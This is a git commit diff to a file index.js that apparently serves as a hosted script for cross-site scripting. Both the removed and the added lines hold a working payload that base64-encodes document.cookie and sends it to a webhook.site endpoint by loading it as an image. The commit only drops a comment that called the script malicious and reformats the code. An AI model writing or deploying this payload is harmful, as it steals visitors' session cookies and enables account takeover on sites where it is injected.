33c36dd956b04048a198af69b36a942015505025
Majed <158180710+0xMajedf@users.noreply.github.com>
2026-03-06 09:22:09 -0800

    Update index.js

--- index.js
+++ index.js
@@ -1,3 +1,2 @@
-// Malicious script hosted on GitHub
-x = new Image(); 
-x.src = 'https://webhook.site/5bbfff60-7dee-41e0-93c4-f4761645f8ed?data=' + btoa(document.cookie);
+x = new Image(); x.src = 'https://webhook.site/5bbfff60-7dee-41e0-93c4-f4761645f8ed?
+data='+btoa(document.cookie);
